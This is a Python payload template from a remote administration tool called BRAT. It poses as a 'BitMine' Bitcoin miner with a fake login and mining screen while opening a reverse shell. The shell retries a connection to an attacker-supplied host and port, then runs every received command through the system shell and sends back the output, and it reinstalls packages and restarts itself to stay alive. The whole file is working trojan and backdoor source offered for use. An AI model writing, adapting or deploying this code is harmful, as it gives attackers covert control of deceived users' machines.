
# Name: Fake Bitcoin miner payload from BRAT.

# Detection risk: High
# Persistent: Yes

# Description: This payload is the default for BRAT (Basic Remote Administration Tool).
# This payload when executed, tries to connect to the server (Attacker), if cannot
# connect, then retry. If connected, then the attacker will have full access to it.
# Meanwhile, it looks like a bitcoin miner. It asks the user to register for a BitMine
# account, then starts "mining" bitcoins. The user will be asked not to close the "miner"
# to let the attacker control the machine FOR A LIMITED TIME. Limited time, because the
# payload is getting suspicious that it does not really mine bitcoins, and run even
# without internet. You can modify the payload to suit your needs.

import socket
import subprocess
import os
import sys
import time
try:
    import multitasking

except:
    while True:
        try:
            os.system('pip install multitasking')
            import multitasking
            break

        except:
            continue

try:
    from getpass import getpass

except:
    while True:
        try:
            os.system("pip install getpass")
            from getpass import getpass
            break

        except:
            continue

s = socket.socket()
n = '\n'
n = n.encode()

def program_restart():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

def try_connect():
    while True:
        try:
            #print("[i] T6Y1NG 70 C0NN3C7...") # Debug only
            s.connect(('{}', {}))
            break

        except ConnectionRefusedError:
            pass

        except:
            pass

@multitasking.task
def main():
    try_connect()
    rplatform = sys.platform.encode()
    rpayload_name = sys.argv[0].encode()
    s.sendall(rplatform)
    s.recv(16)
    s.sendall(rpayload_name)
    while True:
        try:
            #print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
            cmd = s.recv(100000)
            if cmd[:2] == 'cd':
                os.chdir(cmd[3:])
                dir = os.getcwd()
                s.sendall('bacod')

            else:
                results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                results = results.stdout.read() + results.stderr.read()
                try:
                    s.sendall(n+results)

                except:
                    program_restart()

        except(BrokenPipeError, OSError):
            program_restart()

        except:
            program_restart()

if sys.platform == 'nt':
    os.system('cls')

else:
    os.system('clear')

while True:
    try:
        main()
        while True:
            print("BitMine v27.83 build 2956")
            print()
            print('[01] Login\n[02] Register')
            print()
            try:
                l_or_r = int(input(" >>> "))
                if l_or_r == 1:
                    uuser = input("Username: ")
                    upass = getpass()
                    print("No account with username '" + uuser + "' in the servers.")
                    input()

                elif l_or_r == 2:
                    nuser = input("Username: ")
                    npass = getpass()
                    print("Account Created! Now mining bitcoins...")
                    input()
                    bitcoins = 0.00
                    while True:
                        time.sleep(4)
                        if sys.platform in ('windows', 'win', 'nt'):
                            os.system("cls")

                        else:
                            os.system("clear")

                        bitcoins += 0.01
                        print("Mined Bitcoins: " + str(bitcoins))
                        print("Minimum balance withdraw: 100.00 BTC")
                        if bitcoins >= 99.00:
                            print("[ERROR] Unknown hash value!")
                            break

                        else:
                            continue

            except ImportError:
                continue

    except ImportError:
        continue
